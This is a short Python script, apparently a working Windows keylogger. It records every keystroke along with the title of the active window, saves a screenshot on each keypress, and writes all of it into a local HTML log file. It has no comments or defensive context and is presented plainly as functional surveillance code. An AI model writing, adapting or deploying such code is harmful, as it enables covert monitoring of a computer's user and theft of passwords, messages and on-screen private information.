from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
from datetime import datetime
import pyautogui
import os

screen_folder_path = "screenshots"
log_file = "log.html"

if not os.path.exists(screen_folder_path):
    os.makedirs(screen_folder_path)

def get_screenshot_path(time):
    return screen_folder_path + '/' + time.strftime("%H%M%S%f") + '.png'

def parse_key(key):
    try:
        return str(key.char)
    except AttributeError:
        return str(key)

def on_press(key):
    window = GetWindowText(GetForegroundWindow())
    now = datetime.now()
    path = get_screenshot_path(now)
    pyautogui.screenshot(path)
    f = open(log_file, "a")
    f.write('<h1>' + parse_key(key) + '</h1>')
    f.write('<h2>' + window + '</h2>')
    f.write('<img src="' + path + '">')
    f.close()

with Listener(on_press=on_press) as listener:
    listener.join()